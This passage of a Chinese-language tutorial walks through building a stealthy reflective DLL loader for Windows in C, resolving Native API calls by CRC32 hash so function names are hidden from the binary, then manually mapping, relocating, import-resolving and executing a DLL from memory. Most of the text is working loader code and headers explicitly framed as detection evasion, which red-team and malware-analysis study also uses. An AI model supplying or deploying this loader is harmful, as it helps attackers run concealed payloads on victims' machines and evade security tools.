    #define FILL_STRING(string, buffer)                     \
        string.Length = (USHORT)sl(buffer);             \
        string.MaximumLength = string.Length;           \
        string.Buffer = buffer
    #define InitializeObjectAttributes( p, n, a, r, s ) {   \
        (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
        (p)->RootDirectory = r;                             \
        (p)->Attributes = a;                                \
        (p)->ObjectName = n;                                \
        (p)->SecurityDescriptor = s;                        \
        (p)->SecurityQualityOfService = NULL;               \
        }
    
    typedef VOID     (__stdcall *PIO_APC_ROUTINE)(PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,ULONG Reserved);
    typedef VOID     (__stdcall *RtlInitUnicodeString_t)(PUNICODE_STRING DestinationString, PWSTR SourceString);
    typedef NTSTATUS (__stdcall *NtCreateFile_t)(PHANDLE FileHandle,ACCESS_MASK DesiredAccess,POBJECT_ATTRIBUTES ObjectAttributes,PIO_STATUS_BLOCK IoStatusBlock,PLARGE_INTEGER AllocationSize,ULONG FileAttributes,ULONG ShareAccess,ULONG CreateDisposition,ULONG CreateOptions,PVOID EaBuffer,ULONG EaLength);
    typedef NTSTATUS (__stdcall *NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    typedef NTSTATUS (__stdcall *NtQueryInformationFile_t)(HANDLE FileHandle,PIO_STATUS_BLOCK IoStatusBlock,PVOID FileInformation,ULONG Length,FILE_INFORMATION_CLASS FileInformationClass);
    typedef NTSTATUS (__stdcall *NtReadFile_t)(HANDLE FileHandle,HANDLE Event,PIO_APC_ROUTINE ApcRoutine,PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,PVOID Buffer,ULONG Length,PLARGE_INTEGER ByteOffset,PULONG Key);
    

如果您正在跟随进行操作,则可以看到我们需要添加哪些结构以支持Native API函数定义,如下图所示。

![](./img/8904993131683769623.png)

您可以在IDE中看到诸如PUNICODE_STRING或PIO_STATUS_BLOCK等项目未被解析,因此这意味着我们需要在structs.h文件中填充这些结构,如下所示。  
structs.h

    
    
    #include <windows.h>
    
    typedef struct BASE_RELOCATION_BLOCK {
        DWORD PageAddress;
        DWORD BlockSize;
    } BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
    
    typedef struct BASE_RELOCATION_ENTRY {
        USHORT Offset : 12;
        USHORT Type : 4;
    } BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
    
    typedef struct _UNICODE_STRING {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR Buffer;
    } UNICODE_STRING, *PUNICODE_STRING;
    
    typedef struct _OBJECT_ATTRIBUTES {
        ULONG Length;
        HANDLE RootDirectory;
        PUNICODE_STRING ObjectName;
        ULONG Attributes;
        PVOID SecurityDescriptor;
        PVOID SecurityQualityOfService;
    } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
    
    typedef struct _IO_STATUS_BLOCK {
        union {
            NTSTATUS Status;
            PVOID Pointer;
        } DUMMYUNIONNAME;
        ULONG_PTR Information;
    } IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
    
    typedef struct _FILE_STANDARD_INFORMATION {
        LARGE_INTEGER AllocationSize;
        LARGE_INTEGER EndOfFile;
        ULONG NumberOfLinks;
        BOOLEAN DeletePending;
        BOOLEAN Directory;
    } FILE_STANDARD_INFORMATION, *PFILE_STANDARD_INFORMATION;
    
    typedef enum _FILE_INFORMATION_CLASS {
        FileDirectoryInformation = 1, 
        FileFullDirectoryInformation, 
        FileBothDirectoryInformation, 
        FileBasicInformation, 
        FileStandardInformation, 
        FileInternalInformation, 
        FileEaInformation, 
        FileAccessInformation, 
        FileNameInformation, 
        FileRenameInformation, 
        FileLinkInformation, 
        FileNamesInformation, 
        FileDispositionInformation, 
        FilePositionInformation, 
        FileFullEaInformation, 
        FileModeInformation, 
        FileAlignmentInformation, 
        FileAllInformation, 
        FileAllocationInformation, 
        FileEndOfFileInformation, 
        FileAlternateNameInformation, 
        FileStreamInformation, 
        FilePipeInformation, 
        FilePipeLocalInformation, 
        FilePipeRemoteInformation, 
        FileMailslotQueryInformation, 
        FileMailslotSetInformation, 
        FileCompressionInformation, 
        FileObjectIdInformation, 
        FileCompletionInformation, 
        FileMoveClusterInformation, 
        FileQuotaInformation, 
        FileReparsePointInformation, 
        FileNetworkOpenInformation, 
        FileAttributeTagInformation, 
        FileTrackingInformation, 
        FileIdBothDirectoryInformation, 
        FileIdFullDirectoryInformation, 
        FileValidDataLengthInformation, 
        FileShortNameInformation, 
        FileIoCompletionNotificationInformation, 
        FileIoStatusBlockRangeInformation, 
        FileIoPriorityHintInformation, 
        FileSfioReserveInformation, 
        FileSfioVolumeInformation, 
        FileHardLinkInformation, 
        FileProcessIdsUsingFileInformation, 
        FileNormalizedNameInformation, 
        FileNetworkPhysicalNameInformation, 
        FileIdGlobalTxDirectoryInformation, 
        FileIsRemoteDeviceInformation, 
        FileUnusedInformation,
        FileNumaNodeInformation, 
        FileStandardLinkInformation, 
        FileRemoteProtocolInformation, 
        FileRenameInformationBypassAccessCheck, 
        FileLinkInformationBypassAccessCheck, 
        FileVolumeNameInformation, 
        FileIdInformation, 
        FileIdExtdDirectoryInformation, 
        FileReplaceCompletionInformation, 
        FileHardLinkFullIdInformation, 
        FileIdExtdBothDirectoryInformation, 
        FileDispositionInformationEx, 
        FileRenameInformationEx,
        FileRenameInformationExBypassAccessCheck,
        FileDesiredStorageClassInformation, 
        FileStatInformation, 
        FileMaximumInformation
    } FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;
    

现在我们需要为我们当前要使用的函数名称定义函数名称哈希。我们可以使用printf函数以及HASH宏来实现此目的,然后退出,如下所示。

![](./img/3500438943049989465.png)

然后,你需要将这些哈希定义在peb.h文件中,以便我们可以在即将使用的代码中使用它们。

    
    
    #include <stdint.h>
    #include "defs.h"
    
    #define SEED 0xDEADDEAD
    #define HASH(API)(crc32b((uint8_t *)API))
    
    #define RtlInitUnicodeString_CRC32b         0xe17f353f
    #define NtCreateFile_CRC32b                 0x962c4683
    #define NtAllocateVirtualMemory_CRC32b      0xec50426f
    #define NtQueryInformationFile_CRC32b       0xb54956cb
    #define NtReadFile_CRC32b                   0xab569438
    
    extern void *get_ntdll();
    
    uint32_t crc32b(const uint8_t *str);
    
    void *get_proc_address_by_hash(void *dll_address, uint32_t function_hash);
    

**函数混淆**  
现在已经创建了函数哈希和定义,我将向你展示如何混淆函数指针,并在二进制文件中隐藏函数名称。 以下示例中,在使用函数混淆时使用Native
API函数有三个步骤。

**步骤1**
:确保有指向ntdll.dll基地址的指针,如果没有则使用get_ntdll()创建它。接着,创建函数名称的void指针,并使用get_proc_address_by_hash解析基地址和我们在前面步骤中创建的哈希,如下所示。

    
    
    void *p_ntdll = get_ntdll();
    void *p_nt_create_file = get_proc_address_by_hash(p_ntdll, NtCreateFile_CRC32b);
    

上面的指针当前指向ntdll.dll的基地址和NtCreateFile的基地址。

**步骤2** :将函数指针强制转换为其定义类型。

    
    
    NtCreateFile_t g_nt_create_file = (NtCreateFile_t) p_nt_create_file;
    

上面的代码将新变量g_nt_create_file强制转换为NtCreateFile_t类型,因为我们在defs.h中定义了它。  
**步骤3** :像往常一样使用该函数,使用我们的新函数g_nt_create_file。

    
    
    if((status = g_nt_create_file(&h_file, SYNCHRONIZE | GENERIC_READ, &obj_attrs, &io_status_block, 0, 0x0000080, 0x0000007, FILE_OPEN_IF, 0x0000020, 0x0000000, 0)) != 0x0)
            return -1;
    

上面的命令与实际的NtCreateFile函数相同,但使用了混淆的函数指针。
现在我们已经涵盖了辅助函数以及如何应用函数混淆,我们可以开始处理新RDI加载器的第1步。

**隐蔽步骤第1步**  
在此步骤中,从文件中读取DLL文件的二进制表示形式...

    
    
    NTSTATUS status;
    UNICODE_STRING dll_file;
    WCHAR w_file_path[100] = L"\\??\\\\C:\\Temp\\dll_poc.dll";
    void *p_ntdll = get_ntdll();
    void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32b);
    RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;
    g_rtl_init_unicode_string(&dll_file, w_file_path);
    
    OBJECT_ATTRIBUTES obj_attrs;
    IO_STATUS_BLOCK io_status_block;
    InitializeObjectAttributes(&obj_attrs, &dll_file, 0x00000040L, NULL, NULL);
    
    HANDLE h_file = NULL;
    void *p_nt_create_file = get_proc_address_by_hash(p_ntdll, NtCreateFile_CRC32b);
    NtCreateFile_t g_nt_create_file = (NtCreateFile_t) p_nt_create_file;
    if((status = g_nt_create_file(&h_file, SYNCHRONIZE | GENERIC_READ, &obj_attrs, &io_status_block, 0, 0x0000080, 0x0000007, FILE_OPEN_IF, 0x0000020, 0x0000000, 0)) != 0x0)
        return -1;
    
    FILE_STANDARD_INFORMATION file_standard_info;
    void *p_nt_query_information_file = get_proc_address_by_hash(p_ntdll, NtQueryInformationFile_CRC32b);
    NtQueryInformationFile_t g_nt_query_information_file = (NtQueryInformationFile_t) p_nt_query_information_file;
    if((status = g_nt_query_information_file(h_file, &io_status_block, &file_standard_info, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation)) != 0x0)
        return -2;
    
    unsigned long long int dll_size = file_standard_info.EndOfFile.QuadPart;
    void *dll_bytes = NULL;
    void *p_nt_allocate_virtual_memory = get_proc_address_by_hash(p_ntdll, NtAllocateVirtualMemory_CRC32b);
    NtAllocateVirtualMemory_t g_nt_allocate_virtual_memory = (NtAllocateVirtualMemory_t) p_nt_allocate_virtual_memory;
    if((status = g_nt_allocate_virtual_memory(((HANDLE) -1), &dll_bytes, 0, &dll_size, MEM_COMMIT, PAGE_READWRITE)) != 0x0)
        return -3;
    
    void *p_nt_read_file = get_proc_address_by_hash(p_ntdll, NtReadFile_CRC32b);
    NtReadFile_t g_nt_read_file = (NtReadFile_t)p_nt_read_file;
    if((status = g_nt_read_file(h_file, NULL, NULL, NULL, &io_status_block, dll_bytes, dll_size, 0, NULL)) != 0x0)
        return -4;
    

上面的代码是我们基本加载器第1步的等效代码。此版本包括使用函数混淆和函数名称哈希的Native
API函数。你可以看到代码从4行变成了近40行,这还不包括我们添加的结构和定义。

**隐蔽步骤第2步**  
解析DLL文件的PE头以提取重要信息...

    
    
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_bytes;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((unsigned long long int)dll_bytes + dos_header->e_lfanew);
    SIZE_T dll_image_size = nt_headers->OptionalHeader.SizeOfImage;
    

此代码使用PIMAGE_DOS_HEADER和PIMAGE_NT_HEADERS结构查找DLL文件的大小。

**隐蔽步骤第3步**  
在目标进程的地址空间中分配内存以容纳二进制文件...

    
    
    void *dll_base = NULL;
    if((status = g_nt_allocate_virtual_memory(((HANDLE) -1), &dll_base, 0, &dll_image_size, MEM_COMMIT, PAGE_READWRITE)) != 0x0)
        return -4;
    
    unsigned long long int delta_image_base = (unsigned long long int)dll_base - (unsigned long long int)nt_headers->OptionalHeader.ImageBase;
    memcpy(dll_base, dll_bytes, nt_headers->OptionalHeader.SizeOfHeaders);
    
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
    for(size_t i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        void *section_destination = (LPVOID)((unsigned long long int)dll_base + (unsigned long long int)section->VirtualAddress);
        void *section_bytes = (LPVOID)((unsigned long long int)dll_bytes + (unsigned long long int)section->PointerToRawData);
        memcpy(section_destination, section_bytes, section->SizeOfRawData);
        section++;
    }
    

上面的代码为DLL分配虚拟内存并将DLL头复制到分配的内存中,然后迭代DLL的每个节,将它们的内容复制到分配的内存中。该代码计算分配的内存基址与DLL
PE文件头中ImageBase地址之间的差异,并使用memcpy()进行内存复制操作。接下来,代码迭代DLL节,如其PE文件头所定义。

**隐蔽步骤第4步**  
加载器对可执行文件执行任何必要的重定位修复。重定位...

    
    
    IMAGE_DATA_DIRECTORY relocations = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    unsigned long long int relocation_table = relocations.VirtualAddress + (unsigned long long int)dll_base;
    unsigned long relocations_processed = 0;
    
    while(relocations_processed < relocations.Size) {
        PBASE_RELOCATION_BLOCK relocation_block = (PBASE_RELOCATION_BLOCK)(relocation_table + relocations_processed);
        relocations_processed += sizeof(BASE_RELOCATION_BLOCK);
        unsigned long relocations_count = (relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY relocation_entries = (PBASE_RELOCATION_ENTRY)(relocation_table + relocations_processed);
    
        for(unsigned long i = 0; i < relocations_count; i++) {
            relocations_processed += sizeof(BASE_RELOCATION_ENTRY);
            if(relocation_entries[i].Type == 0)
                continue;
    
            unsigned long long int relocation_rva = relocation_block->PageAddress + relocation_entries[i].Offset;
            unsigned long long int address_to_patch = 0;
            void *p_nt_read_virtual_memory = get_proc_address_by_hash(p_ntdll, NtReadVirtualMemory_CRC32b);
            NtReadVirtualMemory_t g_nt_read_virtual_memory = (NtReadVirtualMemory_t) p_nt_read_virtual_memory;
            if((status = g_nt_read_virtual_memory(((HANDLE) -1), (void *)((unsigned long long int)dll_base + relocation_rva), &address_to_patch, sizeof(unsigned long long int), NULL)) != 0x0)
                return -5;
    
            address_to_patch += delta_image_base;
            memcpy((void *)((unsigned long long int)dll_base + relocation_rva), &address_to_patch, sizeof(unsigned long long int));
        }
    }
    

此代码负责对DLL映像执行其新基址的重定位。首先获取重定位数据目录并计算重定位表的RVA。然后遍历重定位表中的每个块,并根据重定位类型和偏移量计算要修补的地址,同时使用PBASE_RELOCATION_ENTRY和PBASE_RELOCATION_BLOCK结构。它读取要修补地址处的原始值,将其加上增量映像基址,,并将其写回到相同位置以更新地址到新位置。此过程确保DLL可以在其新基址上正确运行。

**隐蔽步骤第5步**  
加载器执行任何必要的导入操作。导入是对函数的引用...

    
    
    PIMAGE_IMPORT_DESCRIPTOR import_descriptor;
    IMAGE_DATA_DIRECTORY images_directory = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    UNICODE_STRING import_library_name;
    
    import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(images_directory.VirtualAddress + (unsigned long long int)dll_base);
    void *current_library = NULL;
    
    while(import_descriptor->Name != 0) {
        void *p_ldr_load_dll = get_proc_address_by_hash(p_ntdll, LdrLoadDll_CRC32b);
        char *module_name = (char *)dll_base + import_descriptor->Name;
        wchar_t w_module_name[MAX_PATH];
        unsigned long num_converted;
    
        void *p_rtl_multi_byte_to_unicode_n = get_proc_address_by_hash(p_ntdll, RtlMultiByteToUnicodeN_CRC32b);
        RtlMultiByteToUnicodeN_t g_rtl_multi_byte_to_unicode_n = (RtlMultiByteToUnicodeN_t) p_rtl_multi_byte_to_unicode_n;
        if((status = g_rtl_multi_byte_to_unicode_n(w_module_name, sizeof(w_module_name), &num_converted, module_name, sl(module_name) +1)) != 0x0)
            return -5;
    
        g_rtl_init_unicode_string(&import_library_name, w_module_name);
        LdrLoadDll_t g_ldr_load_dll = (LdrLoadDll_t) p_ldr_load_dll;
        if((status = g_ldr_load_dll(NULL, NULL, &import_library_name, &current_library)) != 0x0)
            return -6;
    
        if (current_library){
            ANSI_STRING a_string;
            PIMAGE_THUNK_DATA thunk = NULL;
            PIMAGE_THUNK_DATA original_thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base + import_descriptor->FirstThunk);
            original_thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base + import_descriptor->OriginalFirstThunk);
            while (thunk->u1.AddressOfData != 0){
                void *p_ldr_get_procedure_address = get_proc_address_by_hash(p_ntdll, LdrGetProcedureAddress_CRC32b);
                LdrGetProcedureAddress_t g_ldr_get_procedure_address = (LdrGetProcedureAddress_t) p_ldr_get_procedure_address;
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                    g_ldr_get_procedure_address(current_library, NULL, (WORD) original_thunk->u1.Ordinal, (PVOID *) &(thunk->u1.Function));
                } else {
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((unsigned long long int)dll_base + thunk->u1.AddressOfData);
                    FILL_STRING(a_string, functionName->Name);
                    g_ldr_get_procedure_address(current_library, &a_string, 0, (PVOID *) &(thunk->u1.Function));
                }
                ++thunk;
                ++original_thunk;
            }
        }
        import_descriptor++;
    }
    

上面的代码处理Windows
PE文件中导入库的动态链接。它遍历PE文件中的导入描述符,使用LdrLoadDll函数加载导入库,使用LdrGetProcedureAddress函数检索导入函数的地址,并使用已解析的地址更新导入地址表(IAT)。该代码使用Windows特定的数据类型和结构(例如PIMAGE_IMPORT_DESCRIPTOR和UNICODE_STRING),并利用通过基于哈希查找获得的函数指针动态调用NTDLL库中的函数，NTDLL库提供管理进程、线程和内存等低层级函数。

**隐蔽步骤第6步**  
加载器应用DLL映像中不同节的保护设置...

    
    
    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section_header++) {
        if (section_header->SizeOfRawData) {
            unsigned long executable = (section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
            unsigned long readable = (section_header->Characteristics & IMAGE_SCN_MEM_READ) != 0;
            unsigned long writeable = (section_header->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
            unsigned long protect = 0;
    
            if (!executable && !readable && !writeable)
                protect = PAGE_NOACCESS;
            else if (!executable && !readable && writeable)
                protect = PAGE_WRITECOPY;
            else if (!executable && readable && !writeable)
                protect = PAGE_READONLY;
            else if (!executable && readable && writeable)
                protect = PAGE_READWRITE;
            else if (executable && !readable && !writeable)
                protect = PAGE_EXECUTE;
            else if (executable && !readable && writeable)
                protect = PAGE_EXECUTE_WRITECOPY;
            else if (executable && readable && !writeable)
                protect = PAGE_EXECUTE_READ;
            else if (executable && readable && writeable)
                protect = PAGE_EXECUTE_READWRITE;
    
            if (section_header->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
                protect |= PAGE_NOCACHE;
    
            void *p_nt_protect_virtual_memory = get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32b);
            NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t) p_nt_protect_virtual_memory;
            size_t size = section_header->SizeOfRawData;
            void *address = dll_base + section_header->VirtualAddress;
            if((status = g_nt_protect_virtual_memory(NtCurrentProcess(), &address, &size, protect, &protect)) != 0x0)
                return -7;
        }
    }
    

上面的代码迭代DLL节,如其PE文件头所定义。对于每个节,它根据节的特性(例如可执行、可读和可写)计算用于加载节的内存区域的保护标志。然后,它调用通过函数指针获得的NtProtectVirtualMemory()函数,设置适当的内存保护以供节使用。

**隐蔽步骤第7步**  
刷新指令缓存并检查TLS是否有条目可复制...

    
    
    void *p_nt_flush_instruction_cache = get_proc_address_by_hash(p_ntdll, NtFlushInstructionCache_CRC32b);
    NtFlushInstructionCache_t g_nt_flush_instruction_cache = (NtFlushInstructionCache_t) p_nt_flush_instruction_cache;
    g_nt_flush_instruction_cache((HANDLE) -1, NULL, 0);
    
    PIMAGE_TLS_CALLBACK *callback;
    PIMAGE_DATA_DIRECTORY tls_entry = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if(tls_entry->Size) {
        PIMAGE_TLS_DIRECTORY tls_dir = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)dll_base + tls_entry->VirtualAddress);
        callback = (PIMAGE_TLS_CALLBACK *)(tls_dir->AddressOfCallBacks);
        for(; *callback; callback++)
            (*callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, NULL);
    }
    

上面的代码在处理IAT后使用NtFlushInstructionCache刷新指令缓存。接下来,代码使用IMAGE_DIRECTORY_ENTRY_TLS常量检查PE文件是否具有其可选头中的TLS(线程本地存储)目录条目。如果有,它将从PE文件中检索TLS目录,其中包含要在线程初始化期间执行的TLS回调函数(AddressOfCallBacks)列表。

**隐蔽步骤第8步**  
最后,加载器将控制权转移到可执行文件的入口点...

    
    
    DLLEntry DllEntry = (DLLEntry)((unsigned long long int)dll_base + nt_headers->OptionalHeader.AddressOfEntryPoint);
    (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);
    
    void *p_nt_close = get_proc_address_by_hash(p_ntdll, NtClose_CRC32b);
    NtClose_t g_nt_close = (NtClose_t) p_nt_close;
    g_nt_close(h_file);
    
    void *p_nt_free_virtual_memory = get_proc_address_by_hash(p_ntdll, NtFreeVirtualMemory_CRC32b);
    NtFreeVirtualMemory_t g_nt_free_virtual_memory = (NtFreeVirtualMemory_t)p_nt_free_virtual_memory;
    g_nt_free_virtual_memory(((HANDLE) -1), &dll_bytes, &dll_size, MEM_RELEASE);
    

上面的代码计算DLL中DLLEntry函数的地址,使用适当的参数调用它,从ntdll模块检索并转换NtClose和NtFreeVirtualMemory函数的函数指针,并使用相关参数调用它们。这些操作可能涉及处理DLL初始化、关闭句柄或文件以及释放为DLL分配的虚拟内存。

**隐蔽最终操作**  
将所有代码放在一起,包括所有新的函数定义和哈希,应该看起来像下面这样。  
structs.h

    
    
    #include <windows.h>
    
    #pragma clang diagnostic push
    #pragma ide diagnostic ignored "bugprone-reserved-identifier"
    
    typedef struct BASE_RELOCATION_BLOCK {
        DWORD PageAddress;
        DWORD BlockSize;
    } BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
    
    typedef struct BASE_RELOCATION_ENTRY {
        USHORT Offset : 12;
        USHORT Type : 4;
    } BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
    
    typedef struct _UNICODE_STRING {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR Buffer;
    } UNICODE_STRING, *PUNICODE_STRING;
    
    typedef struct _OBJECT_ATTRIBUTES {
        ULONG Length;
        HANDLE RootDirectory;
        PUNICODE_STRING ObjectName;
        ULONG Attributes;
        PVOID SecurityDescriptor;
        PVOID SecurityQualityOfService;
    } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
    
    typedef struct _IO_STATUS_BLOCK {
        union {
            NTSTATUS Status;
            PVOID Pointer;
        } DUMMYUNIONNAME;
        ULONG_PTR Information;
    } IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
    
    typedef struct _FILE_STANDARD_INFORMATION {
        LARGE_INTEGER AllocationSize;
        LARGE_INTEGER EndOfFile;
        ULONG NumberOfLinks;
        BOOLEAN DeletePending;
        BOOLEAN Directory;
    } FILE_STANDARD_INFORMATION, *PFILE_STANDARD_INFORMATION;
    
    typedef enum _FILE_INFORMATION_CLASS {
        FileDirectoryInformation = 1,
        FileFullDirectoryInformation,
        FileBothDirectoryInformation,
        FileBasicInformation,
        FileStandardInformation,
        FileInternalInformation,
        FileEaInformation,
        FileAccessInformation,
        FileNameInformation,
        FileRenameInformation,
        FileLinkInformation,
        FileNamesInformation,
        FileDispositionInformation,
        FilePositionInformation,
        FileFullEaInformation,
        FileModeInformation,
        FileAlignmentInformation,
        FileAllInformation,
        FileAllocationInformation,
        FileEndOfFileInformation,
        FileAlternateNameInformation,
        FileStreamInformation,
        FilePipeInformation,
        FilePipeLocalInformation,
        FilePipeRemoteInformation,
        FileMailslotQueryInformation,
        FileMailslotSetInformation,
        FileCompressionInformation,
        FileObjectIdInformation,
        FileCompletionInformation,
        FileMoveClusterInformation,
        FileQuotaInformation,
        FileReparsePointInformation,
        FileNetworkOpenInformation,
        FileAttributeTagInformation,
        FileTrackingInformation,
        FileIdBothDirectoryInformation,
        FileIdFullDirectoryInformation,
        FileValidDataLengthInformation,
        FileShortNameInformation,
        FileIoCompletionNotificationInformation,
        FileIoStatusBlockRangeInformation,
        FileIoPriorityHintInformation,
        FileSfioReserveInformation,
        FileSfioVolumeInformation,
        FileHardLinkInformation,
        FileProcessIdsUsingFileInformation,
        FileNormalizedNameInformation,
        FileNetworkPhysicalNameInformation,
        FileIdGlobalTxDirectoryInformation,
        FileIsRemoteDeviceInformation,
        FileUnusedInformation,
        FileNumaNodeInformation,
        FileStandardLinkInformation,
        FileRemoteProtocolInformation,
        FileRenameInformationBypassAccessCheck,
        FileLinkInformationBypassAccessCheck,
        FileVolumeNameInformation,
        FileIdInformation,
        FileIdExtdDirectoryInformation,
        FileReplaceCompletionInformation,
        FileHardLinkFullIdInformation,
        FileIdExtdBothDirectoryInformation,
        FileDispositionInformationEx,
        FileRenameInformationEx,
        FileRenameInformationExBypassAccessCheck,
        FileDesiredStorageClassInformation,
        FileStatInformation,
        FileMaximumInformation
    } FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;
    
    typedef struct _STRING {
        USHORT Length;
        USHORT MaximumLength;
        PCHAR Buffer;
    } ANSI_STRING, *PANSI_STRING;
    
    #pragma clang diagnostic pop
    

defs.h

    
    
    #include "structs.h"
    
    #define NtCurrentThread() ( (HANDLE)(LONG_PTR) -2 )
    #define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
    #define RTL_CONSTANT_STRING(s) { sizeof(s)-sizeof((s)[0]), sizeof(s), s }
    
    #define OBJ_INHERIT                                 0x00000002L
    #define OBJ_PERMANENT                               0x00000010L
    #define OBJ_EXCLUSIVE                               0x00000020L
    #define OBJ_CASE_INSENSITIVE                        0x00000040L
    #define OBJ_OPENIF                                  0x00000080L
    #define OBJ_OPENLINK                                0x00000100L
    #define OBJ_KERNEL_HANDLE                           0x00000200L
    #define OBJ_FORCE_ACCESS_CHECK                      0x00000400L
    #define OBJ_IGNORE_IMPERSONATED_DEVICEMAP           0x00000800
    #define OBJ_DONT_REPARSE                            0x00001000
    #define OBJ_VALID_ATTRIBUTES                        0x00001FF2
    
    #define FILL_STRING(string, buffer)                     \
        string.Length = (USHORT)strlen(buffer);             \
        string.MaximumLength = string.Length;               \
        string.Buffer = buffer
    
    #define InitializeObjectAttributes( p, n, a, r, s ) {   \
        (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
        (p)->RootDirectory = r;                             \
        (p)->Attributes = a;                                \
        (p)->ObjectName = n;                                \
        (p)->SecurityDescriptor = s;                        \
        (p)->SecurityQualityOfService = NULL;               \
        }
    
    typedef BOOL     (__stdcall *DLLEntry)(HINSTANCE dll, unsigned long reason, void *reserved);
    typedef VOID     (__stdcall *PIO_APC_ROUTINE)(PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,ULONG Reserved);
    typedef VOID     (__stdcall *RtlInitUnicodeString_t)(PUNICODE_STRING DestinationString, PWSTR SourceString);
    typedef NTSTATUS (__stdcall *NtClose_t)(HANDLE);
    typedef NTSTATUS (__stdcall *RtlMultiByteToUnicodeN_t)(PWCH UnicodeString,ULONG MaxBytesInUnicodeString,PULONG BytesInUnicodeString,PCSTR MultiByteString,ULONG BytesInMultiByteString);
    typedef NTSTATUS (__stdcall *NtReadFile_t)(HANDLE FileHandle,HANDLE Event,PIO_APC_ROUTINE ApcRoutine,PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,PVOID Buffer,ULONG Length,PLARGE_INTEGER ByteOffset,PULONG Key);
    typedef NTSTATUS (__stdcall *LdrLoadDll_t)(PCWSTR DllPath, PULONG DllCharacteristics, PUNICODE_STRING DllName, PVOID* DllHandle);
    typedef NTSTATUS (__stdcall *LdrGetProcedureAddress_t)(PVOID DllHandle, PANSI_STRING ProcedureName, ULONG ProcedureNumber, PVOID* ProcedureAddress);
    typedef NTSTATUS (__stdcall *NtCreateFile_t)(PHANDLE FileHandle,ACCESS_MASK DesiredAccess,POBJECT_ATTRIBUTES ObjectAttributes,PIO_STATUS_BLOCK IoStatusBlock,PLARGE_INTEGER AllocationSize,ULONG FileAttributes,ULONG ShareAccess,ULONG CreateDisposition,ULONG CreateOptions,PVOID EaBuffer,ULONG EaLength);
    typedef NTSTATUS (__stdcall *NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    typedef NTSTATUS (__stdcall *NtProtectVirtualMemory_t)(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, DWORD NewProtect, PULONG OldProtect);
    typedef NTSTATUS (__stdcall *NtFreeVirtualMemory_t)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
    typedef NTSTATUS (__stdcall *NtReadVirtualMemory_t)(HANDLE ProcessHandle,PVOID BaseAddress,PVOID Buffer,SIZE_T BufferSize,PSIZE_T NumberOfBytesRead);
    typedef NTSTATUS (__stdcall *NtFlushInstructionCache_t)(HANDLE ProcessHandle, PVOID BaseAddress, SIZE_T Length);
    typedef NTSTATUS (__stdcall *NtQueryInformationFile_t)(HANDLE FileHandle,PIO_STATUS_BLOCK IoStatusBlock,PVOID FileInformation,ULONG Length,FILE_INFORMATION_CLASS FileInformationClass);
    

peb.h

    
    
    #include <stdint.h>
    #include "defs.h"
    
    #define SEED 0xDEADDEAD
    #define HASH(API)(crc32b((uint8_t *)API))
    
    #define RtlInitUnicodeString_CRC32b         0xe17f353f
    #define RtlMultiByteToUnicodeN_CRC32b       0xaba11095
    #define LdrLoadDll_CRC32b                   0x43638559
    #define LdrGetProcedureAddress_CRC32b       0x3b93e684
    #define NtCreateFile_CRC32b                 0x962c4683
    #define NtReadFile_CRC32b                   0xab569438
